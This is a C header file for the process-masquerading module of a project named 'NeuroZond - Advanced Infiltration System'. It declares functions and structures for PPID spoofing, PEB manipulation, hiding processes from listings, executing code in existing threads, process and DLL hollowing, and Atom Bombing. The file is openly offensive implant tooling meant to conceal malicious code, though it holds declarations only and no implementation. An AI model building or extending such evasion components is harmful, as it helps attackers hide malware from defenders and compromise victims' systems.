/**
 * NeuroZond - Advanced Infiltration System
 * Process Masquerading Module Header
 * 
 * This file defines functions and structures for
 * process masquerading and hiding techniques.
 */

#ifndef PROCESS_MASQ_H
#define PROCESS_MASQ_H

#include "../core/neurozond.h"

#ifdef __cplusplus
extern "C" {
#endif

/*
 * Process masquerading techniques
 */
typedef enum {
    NZ_MASQ_TECHNIQUE_NONE = 0,
    NZ_MASQ_TECHNIQUE_PPID_SPOOFING,     // Parent Process ID Spoofing
    NZ_MASQ_TECHNIQUE_PEB_MANIPULATION,  // Process Environment Block manipulation
    NZ_MASQ_TECHNIQUE_IMAGE_HIDING,      // Hide process from process lists
    NZ_MASQ_TECHNIQUE_THREAD_CONTEXT,    // Execute in existing thread context
    NZ_MASQ_TECHNIQUE_PROCESS_HOLLOWING, // Process hollowing
    NZ_MASQ_TECHNIQUE_DLL_HOLLOWING,     // DLL hollowing
    NZ_MASQ_TECHNIQUE_ATOM_BOMBING,      // Atom Bombing technique
    NZ_MASQ_TECHNIQUE_CUSTOM            // Custom technique
} NZ_MASQ_TECHNIQUE;

/*
 * Process creation flags
 */
typedef enum {
    NZ_PROC_FLAG_NONE              = 0x00000000,
    NZ_PROC_FLAG_SUSPENDED         = 0x00000001, // Create suspended
    NZ_PROC_FLAG_HIDDEN            = 0x00000002, // Hidden from process lists
    NZ_PROC_FLAG_INHERIT_HANDLES   = 0x00000004, // Inherit handles
    NZ_PROC_FLAG_NO_WINDOW         = 0x00000008, // No window
    NZ_PROC_FLAG_DETACHED          = 0x00000010, // Detached process
    NZ_PROC_FLAG_BREAKAWAY         = 0x00000020, // Breakaway from job
    NZ_PROC_FLAG_PROTECT_PROCESS   = 0x00000040, // Protected process
    NZ_PROC_FLAG_INHERIT_CONSOLE   = 0x00000080  // Inherit console
} NZ_PROC_FLAGS;

/*
 * Process masquerading options structure
 */
typedef struct {
    NZ_MASQ_TECHNIQUE technique;    // Masquerading technique to use
    char target_process_name[MAX_PATH]; // Name of target process to masquerade as
    uint32_t target_pid;            // Target process ID (if applicable)
    uint32_t parent_pid;            // Parent process ID for spoofing
    uint32_t session_id;            // Session ID
    NZ_PROC_FLAGS flags;            // Process creation flags
    bool inherit_handles;           // Whether to inherit handles
    void* custom_data;              // Custom data for specific techniques
    size_t custom_data_size;        // Size of custom data
} NZ_MASQ_OPTIONS;

/*
 * Process information structure
 */
typedef struct {
    uint32_t pid;                   // Process ID
    uint32_t ppid;                  // Parent Process ID
    void* process_handle;           // Process handle (platform-specific)
    void* main_thread_handle;       // Main thread handle (platform-specific)
    uint32_t main_thread_id;        // Main thread ID
    uintptr_t base_address;         // Base address of process
    char process_name[MAX_PATH];     // Process name
    char image_path[MAX_PATH];       // Full image path
    uint32_t session_id;            // Session ID
    bool is_wow64;                  // Is WOW64 process (32-bit on 64-bit)
    bool is_suspended;              // Is process suspended
} NZ_PROCESS_INFO;

/**
 * Initialize the process masquerading module
 *
 * @return Status code
 */
NZ_STATUS NZ_Masq_Initialize(void);

/**
 * Clean up resources used by the process masquerading module
 */
void NZ_Masq_Cleanup(void);

/**
 * Create a masqueraded process
 *
 * @param command_line Command line for the new process
 * @param options Masquerading options
 * @param process_info Output process information
 * @return Status code
 */
NZ_STATUS NZ_Masq_CreateProcess(
    const char* command_line,
    const NZ_MASQ_OPTIONS* options,
    NZ_PROCESS_INFO* process_info
);

/**
 * Spoof the Parent Process ID (PPID) for a new process
 *
 * @param target_ppid Target parent process ID to spoof
 * @param command_line Command line for the new process
 * @param process_info Output process information
 * @return Status code
 */
NZ_STATUS NZ_Masq_SpoofPPID(
    uint32_t target_ppid,
    const char* command_line,
    NZ_PROCESS_INFO* process_info
);

/**
 * Modify the Process Environment Block (PEB) of a process
 * to masquerade as another process
 *
 * @param process_info Process information
 * @param new_image_path New image path to use
 * @param new_command_line New command line to use
 * @return Status code
 */
NZ_STATUS NZ_Masq_ModifyPEB(
    const NZ_PROCESS_INFO* process_info,
    const char* new_image_path,
    const char* new_command_line
);

/**
 * Hide a process from process listings
 *
 * @param process_info Process information
 * @param hide_type Type of hiding (0 = unlink from list, 1 = modify name)
 * @return Status code
 */
NZ_STATUS NZ_Masq_HideProcess(
    const NZ_PROCESS_INFO* process_info,
    int hide_type
);

/**
 * Execute code in the context of an existing thread
 *
 * @param thread_id Target thread ID
 * @param code_addr Address of code to execute
 * @param param Parameter to pass to the code
 * @return Status code
 */
NZ_STATUS NZ_Masq_ThreadExecute(
    uint32_t thread_id,
    void* code_addr,
    void* param
);

/**
 * Perform process hollowing (replace process memory with custom code)
 *
 * @param process_info Target process information
 * @param payload_data Payload data to inject
 * @param payload_size Size of payload data
 * @param entry_point_offset Offset to entry point relative to payload start
 * @return Status code
 */
NZ_STATUS NZ_Masq_ProcessHollowing(
    const NZ_PROCESS_INFO* process_info,
    const void* payload_data,
    size_t payload_size,
    size_t entry_point_offset
);

/**
 * Get information about a process by its ID
 *
 * @param pid Process ID
 * @param process_info Output process information
 * @return Status code
 */
NZ_STATUS NZ_Masq_GetProcessInfo(
    uint32_t pid,
    NZ_PROCESS_INFO* process_info
);

/**
 * Find a process by name
 *
 * @param process_name Process name to find
 * @param process_info Output process information
 * @return Status code
 */
NZ_STATUS NZ_Masq_FindProcessByName(
    const char* process_name,
    NZ_PROCESS_INFO* process_info
);

/**
 * Resume a suspended process
 *
 * @param process_info Process information
 * @return Status code
 */
NZ_STATUS NZ_Masq_ResumeProcess(
    const NZ_PROCESS_INFO* process_info
);

/**
 * Suspend a running process
 *
 * @param process_info Process information
 * @return Status code
 */
NZ_STATUS NZ_Masq_SuspendProcess(
    const NZ_PROCESS_INFO* process_info
);

/**
 * Terminate a process
 *
 * @param process_info Process information
 * @param exit_code Exit code
 * @return Status code
 */
NZ_STATUS NZ_Masq_TerminateProcess(
    const NZ_PROCESS_INFO* process_info,
    int exit_code
);

#ifdef __cplusplus
}
#endif

#endif /* PROCESS_MASQ_H */ 